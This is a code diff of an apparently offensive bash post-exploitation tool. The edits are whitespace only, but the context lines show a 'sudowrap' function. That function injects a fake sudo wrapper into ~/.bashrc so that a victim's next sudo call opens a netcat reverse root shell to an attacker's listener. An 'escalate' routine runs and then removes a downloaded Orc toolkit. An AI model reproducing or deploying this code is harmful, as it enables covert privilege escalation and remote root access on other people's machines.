@@ -19,7 +19,7 @@ payloads=(
 function display_output(){
 		local h=${1-10}
 		local w=${2-41}
-		local t=${3-Output} 
+		local t=${3-Output}
 		dialog --title "${t}" --clear --msgbox "$(<$OUTPUT)" ${h} ${w}
 }
 
@@ -71,34 +71,34 @@ function genpayload(){
 
 
 function sudowrap(){
-			cat <<-EOF
+		cat <<-EOF
 
-				-- sudo command injection wrapper --
+			-- sudo command injection wrapper --
 
-				*******
-				WARNING
-				*******
-				This function wraps this system's sudo command with a function that runs a root netcat reverse shell when 'sudo' is run in terminal
-				for privilege escalation. (If this user is added to /etc/sudoers)
- 
-				Wait for your target to log in and run sudo and you will receive a reverse root shell.
+			*******
+			WARNING
+			*******
+			This function wraps this system's sudo command with a function that runs a root netcat reverse shell when 'sudo' is run in terminal
+			for privilege escalation. (If this user is added to /etc/sudoers)
 
-				EOF
-			read -p "enter (continue/exit) or press enter to return to menu: " ce
-			case $ce in
-				[CONTINUEcontinue]* )
-					shell=${payloads[0]}
-					echo -e "Enter listener server address and port\n"
-					read -r -p "Address: " address
-					read -r -p "Port: " port
-					shell="${shell/'address'/$address}"
-					shell="${shell/'prt'/$port}"
-					echo -e "function sudo(){ \n(sudo ${shell} > /dev/null 2>.1 &)\n /usr/bin/sudo \$1 \$2 \$3 \$4 \$5 \$6 \$7 \$8 \$9 \n}" > $HOME/.sudo
-					echo "source ~/.sudo" >> ~/.bashrc
-					echo -e "\nsudo injection complete!\n\nTo effect changes for this terminal session enter 'source ~/.bashrc' in terminal\n"
-					read -p "Press enter to continue ";;
-			[Exitexit]* ) return;;
-			esac
+			Wait for your target to log in and run sudo and you will receive a reverse root shell.
+
+			EOF
+		read -p "enter (continue/exit) or press enter to return to menu: " ce
+		case $ce in
+			[CONTINUEcontinue]* )
+				shell=${payloads[0]}
+				echo -e "Enter listener server address and port\n"
+				read -r -p "Address: " address
+				read -r -p "Port: " port
+				shell="${shell/'address'/$address}"
+				shell="${shell/'prt'/$port}"
+				echo -e "function sudo(){ \n(sudo ${shell} > /dev/null 2>.1 &)\n /usr/bin/sudo \$1 \$2 \$3 \$4 \$5 \$6 \$7 \$8 \$9 \n}" > $HOME/.sudo
+				echo "source ~/.sudo" >> ~/.bashrc
+				echo -e "\nsudo injection complete!\n\nTo effect changes for this terminal session enter 'source ~/.bashrc' in terminal\n"
+				read -p "Press enter to continue ";;
+		[Exitexit]* ) return;;
+		esac
 }
 
 
@@ -247,7 +247,7 @@ function escalate(){
 			EOF
 			ENV=$HOME/Orc/Orc-master/o.rc sh -i
 			rm -rf $HOME/Orc
-		
+
 		}
 
 
